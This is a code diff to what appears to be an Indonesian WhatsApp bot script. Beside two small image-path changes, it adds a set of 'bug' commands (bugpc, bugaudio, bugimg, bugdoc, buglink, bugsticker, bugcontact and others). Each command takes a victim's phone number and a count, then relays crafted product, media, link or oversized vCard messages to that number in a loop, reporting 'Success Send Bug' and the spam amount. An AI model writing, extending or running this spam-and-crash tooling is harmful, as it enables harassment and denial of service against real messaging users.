@@ -1964,7 +1964,7 @@ quickReplyButton: {
     id: 'menu'
 }
 }]
- karutamd = fs.readFileSync('./karuta/karuta.jpg')
+ karutamd = fs.readFileSync('./karuta/menu.gif')
  let txt = `「 Broadcast Bot 」\n\n${text}`
  naimi.send5ButImg(i, txt, ` © ${setting.botName} bot`, karutamd, btn)
     }
@@ -2042,7 +2042,7 @@ quickReplyButton: {
     id: 'menu'
 }
 }]
- karutamd = fs.readFileSync('./karuta/karuta.jpg')
+ karutamd = fs.readFileSync('./karuta/menu.gif')
  let txt = `「 Broadcast Bot 」\n\n${text}`
  naimi.send5ButImg(yoi, txt, ` © ${setting.botName} bot`, karutamd, btn)
 }
@@ -5914,6 +5914,8 @@ pro = `*PROFILE OWNER VYTHRZ*
 • Hanyalah Seorang Newbie`
 naimi.sendMessage(m.chat, { video: { url:'https://a.top4top.io/p_23914exr31.jpg' }, gifPlayback: true , caption:pro}, { quoted: m })
 break
+
+// Menu Bot
 case 'menu':
 case 'list':
 case 'help':
@@ -5990,6 +5992,198 @@ setTimeout( () => {
  naimi.sendMessage(from, { react: { text: `🥶`, key: m.key }})
 }, 3000)
 break
+
+// Case Bug
+case 'bugpc': case 'buggc':  {
+  if (!isPremium) return m.reply('Anda Bukan User Premium')
+  num = q.split('|')[0]
+  jumlah = q.split('|')[1]
+  for (let i = 0; i < jumlah; i++) {
+  var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./karuta/menu.gif') }, { upload: naimi.waUploadToServer })
+  var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
+  "productMessage": {
+  "product": {
+  "productImage": messa.imageMessage,
+  "productId": "449756950375071",
+  "title": `Reyzzx`,
+  "description": `Bug`,
+  "currencyCode": "IDR",
+  "footerText": `Reyzzx`,
+  "productImageCount": 1,
+  "firstImageId": 1,
+  "retailerId": `Reyzzx`,
+  "url": "wa.me/6285158338027"
+  },
+  "businessOwnerJid": "6285158338027@s.whatsapp.net",
+  }
+  }), { userJid: m.chat, quoted: doc})
+  naimi.relayMessage(num, catalog.message, { messageId: catalog.key.id })
+  }
+  tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
+  m.reply(tekteka)
+  }
+  break
+  case 'bugaudio': {
+  num = q.split('|')[0]
+  jumlah = q.split('|')[1]
+  for (let i = 0; i < jumlah; i++) {
+  var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+  "audioMessage": {
+  "url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
+  "mimetype": "audio/mpeg",
+  "fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
+  "fileLength": "258330",
+  "seconds": 16,
+  "ptt": false,
+  "mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
+  "fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
+  "directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
+  "mediaKeyTimestamp": "1657190832",
+  }
+  }), { userJid: m.chat, quoted: doc})
+  naimi.relayMessage(num, audio.message, { messageId: audio.key.id })
+  }
+  tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
+  m.reply(tekteka)
+  }
+  break
+  case 'bugimg': {
+  num = q.split('|')[0]
+  jumlah = q.split('|')[1]
+  for (let i = 0; i < jumlah; i++) {
+  var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./karuta/menu.gif') }, { upload: naimi.waUploadToServer })
+  var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+  "imageMessage": {
+  "url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
+  "mimetype": "image/jpeg",
+  "caption": `Reyzzx`,
+  "fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
+  "fileLength": "42521",
+  "height": 426,
+  "width": 640,
+  "mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
+  "fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
+  "directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
+  "mediaKeyTimestamp": "1657286523",
+  "jpegThumbnail": messa.imageMessage,
+  }
+  }), { userJid: m.chat, quoted: doc})
+  naimi.relayMessage(num, image.message, { messageId: image.key.id })
+  }
+  tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
+  m.reply(tekteka)
+  }
+  break
+  case 'bugdoc': {
+  num = q.split('|')[0]
+  jumlah = q.split('|')[1]
+  for (let i = 0; i < jumlah; i++) {
+  var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./karuta/menu.gif') }, { upload: naimi.waUploadToServer })
+  var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+  "documentMessage": {
+  "url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
+  "mimetype": "application/octet-stream",
+  "title": ".dev",
+  "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+  "pageCount": 0,
+  "mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
+  "fileName": `Bug Whatsapp By Reyzzx`,
+  "fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
+  "directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
+  "mediaKeyTimestamp": "1657288637",
+  }
+  }), { userJid: m.chat, quoted: doc})
+  naimi.relayMessage(num, document.message, { messageId: document.key.id })
+  }
+  tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
+  m.reply(tekteka)
+  }
+  break
+  case 'buglink': {
+  num = q.split('|')[0]
+  jumlah = q.split('|')[1]
+  for (let i = 0; i < jumlah; i++) {
+  var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+  "extendedTextMessage": {
+  "text": `https://chat.whatsapp.com/L3cyibQLF82I3IytAwuq8t\n\nVythrz`,
+  "matchedText": "https://chat.whatsapp.com/L3cyibQLF82I3IytAwuq8t",
+  "description": "Undangan Grup WhatsApp",
+  "title": `Bug Whatsapp By Reyzzx`,
+  "previewType": "NONE",
+  }
+  }), { userJid: m.chat, quoted: doc})
+  naimi.relayMessage(num, extended.message, { messageId: extended.key.id })
+  }
+  tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
+  m.reply(tekteka)
+  }
+  break
+  case 'bugstick': case 'bugsticker': case 'bugs': {
+
+  num = q.split('|')[0]
+  jumlah = q.split('|')[1]
+  for (let i = 0; i < jumlah; i++) {
+  var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+  "stickerMessage": {
+  "url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+  "fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+  "fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+  "mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+  "mimetype": "image/webp",
+  "height": 64,
+  "width": 64,
+  "directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+  "fileLength": "7774",
+  "mediaKeyTimestamp": "1657290167",
+  "isAnimated": false,
+  }
+  }), { userJid: m.chat, quoted: doc})
+  naimi.relayMessage(num, sticker.message, { messageId: sticker.key.id })
+  }
+  tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
+  m.reply(tekteka)
+  }
+  break
+  case 'bugiml': {
+  
+  num = q.split('|')[0]
+  jumlah = q.split('|')[1]
+  for (let i = 0; i < jumlah; i++) {
+  var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./karuta/menu.gif') }, { upload: naimi.waUploadToServer })
+  var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+  "extendedTextMessage": {
+  "text": "https://wa.me/c/6285158338027",
+  "matchedText": "https://wa.me/c/6285158338027",
+  "description": "Vythr By Reyzzx",
+  "title": `Bug Whatsapp By Reyzzx`,
+  "previewType": "NONE",
+  "jpegThumbnail": messa.imageMessage,
+  }
+  }), { userJid: m.chat, quoted: doc})
+  naimi.relayMessage(num, extended.message, { messageId: extended.key.id })
+  }
+  tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
+  m.reply(tekteka)
+  }
+  break
+  case 'bugcontact': case 'bugc': {
+  
+  num = q.split('|')[0]
+  jumlah = q.split('|')[1]
+  for (let i = 0; i < jumlah; i++) {
+  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+  "contactMessage": {
+  "displayName": `Bug Whatsapp By Reyzzx`,
+  "vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:vythrz\nitem1.TEL;waid=6282138746029:+62 821-3874-6029\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Reyzzx\nX-WA-BIZ-NAME:vythrz\nEND:VCARD",
+  }
+  }), { userJid: m.chat, quoted: doc})
+  naimi.relayMessage(num, contact.message, { messageId: contact.key.id })
+  }
+  tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
+  m.reply(tekteka)
+  }
+  break
+
 default:
 if (budy.startsWith('sendkontak')) {
   const kasihkon = 'BEGIN:VCARD\n'
